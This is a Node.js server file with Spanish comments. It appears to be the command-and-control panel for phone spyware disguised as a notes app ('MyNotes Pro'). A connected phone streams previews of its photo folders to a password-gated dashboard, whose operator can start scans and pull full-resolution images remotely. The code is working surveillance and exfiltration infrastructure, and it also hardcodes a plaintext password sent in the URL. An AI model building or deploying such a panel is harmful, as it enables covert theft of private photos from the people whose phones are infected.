const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');

const app = express();
app.use(cors());

// --- SEGURIDAD: LOGIN SIMPLE ---
// Cambia "admin123" por la contraseña que quieras
const AUTH_PASS = "admin123"; 

app.get('/', (req, res) => {
    // Verificamos si mandó la contraseña en la URL (?auth=admin123)
    if (req.query.auth !== AUTH_PASS) {
        return res.send(`
            <body style="background:#121212; color:white; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif;">
                <div style="text-align:center;">
                    <h2>🔒 ACCESO DENEGADO</h2>
                    <input type="password" id="pass" placeholder="Contraseña..." style="padding:10px;">
                    <button onclick="window.location.href='/?auth='+document.getElementById('pass').value">ENTRAR</button>
                </div>
            </body>
        `);
    }

    // SI LA CONTRASEÑA ES CORRECTA, MOSTRAMOS EL PANEL:
    res.send(`
    <html>
        <head>
            <title>MyNotes Pro - Panel</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: 'Segoe UI', sans-serif; background: #121212; color: white; margin: 0; padding: 20px; }
                
                .dashboard {
                    position: sticky; top: 0; z-index: 100;
                    background: #1e1e1e; padding: 15px; border-radius: 10px;
                    border: 1px solid #333; box-shadow: 0 5px 15px rgba(0,0,0,0.5);
                    margin-bottom: 20px;
                }

                .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
                
                /* FILTRO DE CARPETAS */
                select {
                    padding: 10px; background: #333; color: white; border: 1px solid #555; border-radius: 5px; font-weight: bold; width: 100%;
                }

                .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 10px;}
                button { padding: 12px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; color: white; transition: 0.2s; }
                
                #btnStart { background: #2979ff; }
                #btnStop { background: #d50000; }
                
                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 8px; }
                
                .card { background: #000; border-radius: 5px; overflow: hidden; position: relative; border: 1px solid #333; }
                .card img { width: 100%; height: 100px; object-fit: cover; }
                .card.hd img { border-bottom: 3px solid #00e676; height: 120px; }
                
                .badge {
                    position: absolute; top: 5px; right: 5px; background: rgba(0,0,0,0.7); 
                    color: #fff; padding: 2px 6px; font-size: 9px; border-radius: 4px;
                }
            </style>
        </head>
        <body>
            <div class="dashboard">
                <div class="top-bar">
                    <span id="status" style="color:#ff1744">Desconectado</span>
                    <span id="counter">0 fotos</span>
                </div>

                <select id="folderFilter" onchange="filterImages()">
                    <option value="ALL">📂 TODAS LAS CARPETAS</option>
                </select>
                
                <div class="controls">
                    <button id="btnStart" onclick="sendCommand('start')">▶ ESCANEAR</button>
                    <button id="btnStop" onclick="sendCommand('stop')">⏹ PARAR</button>
                </div>
            </div>

            <div class="grid" id="grid"></div>

            <script src="/socket.io/socket.io.js"></script>
            <script>
                const socket = io();
                const grid = document.getElementById('grid');
                const filterSelect = document.getElementById('folderFilter');
                
                let folders = new Set(); // Para guardar nombres de carpetas únicos

                function sendCommand(action) {
                    socket.emit('admin_command', { action: action === 'start' ? 'start_scan' : 'stop_scan' });
                }

                socket.on('connection_alert', msg => {
                    document.getElementById('status').innerText = msg;
                    document.getElementById('status').style.color = msg.includes("Conectado") ? "#00e676" : "#ff1744";
                });

                socket.on('new_preview', data => {
                    if(document.getElementById(data.path)) return;
                    
                    // 1. Agregar carpeta al filtro si es nueva
                    if (!folders.has(data.folder)) {
                        folders.add(data.folder);
                        const option = document.createElement('option');
                        option.value = data.folder;
                        option.innerText = "📁 " + data.folder;
                        filterSelect.appendChild(option);
                    }

                    // 2. Crear tarjeta visual
                    const div = document.createElement('div');
                    div.className = 'card';
                    div.id = data.path;
                    div.setAttribute('data-folder', data.folder); // Etiqueta oculta para filtrar
                    div.innerHTML = \`
                        <span class="badge">\${data.folder}</span>
                        <img src="data:image/jpeg;base64,\${data.image64}">
                        <button style="width:100%; padding:5px; background:#6200ea; border:none; color:white; font-weight:bold; cursor:pointer;" onclick="pedirHD('\${data.path}')">⚡ HD</button>
                    \`;
                    
                    // Respetar el filtro actual
                    if (filterSelect.value !== "ALL" && filterSelect.value !== data.folder) {
                        div.style.display = "none";
                    }
                    
                    grid.prepend(div);
                    document.getElementById('counter').innerText = document.getElementsByClassName('card').length + " fotos";
                });

                socket.on('receive_full', data => {
                    downloadBase64File(data.image64, data.name);
                    const name = data.name.replace("HD_", "");
                    const cards = document.getElementsByClassName('card');
                    for(let c of cards) {
                        if(c.id === data.path || c.innerHTML.includes(name)) {
                            c.classList.add('hd');
                            c.querySelector('img').src = "data:image/jpeg;base64," + data.image64;
                            c.querySelector('button').innerText = "✅";
                            c.querySelector('button').style.background = "#00c853";
                        }
                    }
                });

                function filterImages() {
                    const selected = filterSelect.value;
                    const cards = document.getElementsByClassName('card');
                    for(let c of cards) {
                        if (selected === "ALL" || c.getAttribute('data-folder') === selected) {
                            c.style.display = "block";
                        } else {
                            c.style.display = "none";
                        }
                    }
                }

                function pedirHD(path) { socket.emit('order_download', { path: path }); }

                function downloadBase64File(base64Data, fileName) {
                    const link = document.createElement('a');
                    link.href = "data:image/jpeg;base64," + base64Data;
                    link.download = fileName;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                }
            </script>
        </body>
    </html>
    `);
});

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" }, allowEIO3: true, maxHttpBufferSize: 1e8 });

io.on('connection', (socket) => {
    io.emit('connection_alert', '✅ Celular Conectado');
    socket.on('usrData', (data) => {
        if (data.dataType === 'preview_image') io.emit('new_preview', data);
        else if (data.dataType === 'full_image') io.emit('receive_full', data);
    });
    socket.on('admin_command', (cmd) => socket.broadcast.emit('command_' + cmd.action));
    socket.on('order_download', (data) => socket.broadcast.emit('request_full_image', data));
    socket.on('disconnect', () => io.emit('connection_alert', '❌ Desconectado'));
});

server.listen(process.env.PORT || 3000, () => console.log('Servidor Pro listo'));
